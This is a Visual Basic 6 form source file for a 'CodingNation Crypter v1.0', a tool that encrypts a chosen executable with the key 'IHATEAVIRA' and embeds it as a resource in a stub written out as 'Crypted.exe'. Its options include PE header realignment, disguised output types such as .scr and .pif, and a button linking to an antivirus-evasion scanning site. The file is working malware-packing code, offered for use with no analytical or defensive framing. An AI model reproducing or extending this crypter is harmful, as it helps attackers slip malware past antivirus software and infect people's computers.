VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BackColor       =   &H80000007&
   Caption         =   "CodingNation Crypter v1.0                    <TsGh Sniper>"
   ClientHeight    =   3075
   ClientLeft      =   120
   ClientTop       =   510
   ClientWidth     =   6090
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3075
   ScaleWidth      =   6090
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog DlgSave 
      Left            =   7440
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H80000012&
      Caption         =   "Realign PE Header"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   2400
      Width           =   1815
   End
   Begin VB.CommandButton cmdScan 
      Caption         =   "&Scan File"
      Height          =   255
      Left            =   1560
      TabIndex        =   4
      Top             =   2760
      Width           =   1335
   End
   Begin VB.CommandButton cmdAction1 
      Caption         =   "&Browse"
      Height          =   285
      Left            =   4680
      TabIndex        =   1
      Top             =   2040
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "Please Select A File..."
      Top             =   2040
      Width           =   4455
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   1815
      Left            =   0
      Picture         =   "frmMain.frx":000C
      ScaleHeight     =   1815
      ScaleWidth      =   6255
      TabIndex        =   3
      Top             =   -120
      Width           =   6255
   End
   Begin VB.CommandButton cmdAction 
      BackColor       =   &H80000000&
      Caption         =   "&Crypt"
      Height          =   255
      Left            =   120
      MaskColor       =   &H00FFFFFF&
      TabIndex        =   2
      Top             =   2760
      UseMaskColor    =   -1  'True
      Width           =   1335
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "File Location:"
      ForeColor       =   &H8000000E&
      Height          =   255
      Left            =   120
      TabIndex        =   5
      Top             =   1800
      Width           =   1095
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
Private Declare Function GetFileNameFromBrowseW Lib "shell32" Alias "#63" (ByVal hwndOwner As Long, ByVal lpstrFile As Long, ByVal nMaxFile As Long, ByVal lpstrInitialDir As Long, ByVal lpstrDefExt As Long, ByVal lpstrFilter As Long, ByVal lpstrTitle As Long) As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #1
    lFileSize = LOF(1)
    sData = Input$(lFileSize, 1)
    Close #1
    LoadFile = sData
End Function

Private Function AddFile(sInPath As String, sOutPath As String)
Dim sFile As String
Dim hRes As String
Dim sBuff As String
Dim c As New CCrypto

Open sInPath For Binary As #1
sFile = Space(LOF(1))
Get #1, , sFile
Close #1

hRes = BeginUpdateResource(sOutPath, False)
sFile = c.Encrypt(sFile, "IHATEAVIRA", False, frezBlockEncryption)
Call UpdateResource(hRes, "CUSTOM", 101, 0, ByVal sFile, Len(sFile))
Call EndUpdateResource(hRes, False)

If Check1.Value = 1 Then
Call RealignPEFromFile(Text1.Text)
Else
End If

End Function
Private Sub cmdAction_Click()
Dim sSize As String * 8
Dim sBuff1 As String
Dim SERVER_RESOURCE() As Byte
Dim cryptedpath As String
    
    If Text1.Text = "" Or Text1.Text = "Please Select A File..." Then
        MsgBox "Please Select A File To Crypt First!"
        Exit Sub
        Else
        End If
        
On Error Resume Next
        With DlgSave
        .CancelError = True
        .DefaultExt = ".exe"
        .Filter = "Exe Files (*.exe)|*.exe|Scr Files (*.scr)|*.scr|Com Files (*.com)|*.com|Bat Files (*.bat)|*.bat|Pif Files (*.pif)|*.pif|"
        .FileName = "Crypted.exe"
        .ShowSave
        End With
        cryptedpath = DlgSave.FileName
    Kill cryptedpath
Open cryptedpath For Binary As #1
SERVER_RESOURCE() = LoadResData(101, "CUSTOM")
Put #1, , SERVER_RESOURCE
Close #1

Call AddFile(Text1.Text, cryptedpath)

End Sub
Private Sub cmdAction1_Click()
Dim sSave As String
            sSave = Space(255)
            GetFileNameFromBrowseW Me.hwnd, StrPtr(sSave), 255, StrPtr("c:\"), StrPtr("txt"), StrPtr("Apps (*.EXE)" + Chr$(0) + "*.EXE" + Chr$(0) + "All files (*.*)" + Chr$(0) + "*.*" + Chr$(0)), StrPtr("Select File")
            Text1 = Left$(sSave, lstrlen(sSave))
End Sub

Private Sub cmdScan_Click()
Call ShellExecute(0, "open", "http://scanner.novirusthanks.org/index.php?options=1", CStr(0), CStr(0), 1)
End Sub

Private Sub Label2_Click()
Call cmdAction_Click
End Sub

Private Sub mnuMenu_Click()

End Sub
